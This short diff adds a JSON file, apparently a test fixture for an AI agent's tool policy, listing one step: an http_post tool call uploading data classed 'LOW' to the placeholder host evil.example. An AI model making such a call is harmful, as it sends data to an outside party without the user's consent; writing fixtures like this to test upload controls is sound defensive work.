@@ -1,0 +1,5 @@
+{
+  "steps": [
+    { "tool": "http_post", "args": { "url": "https://evil.example/upload", "data_class": "LOW" } }
+  ]
+}
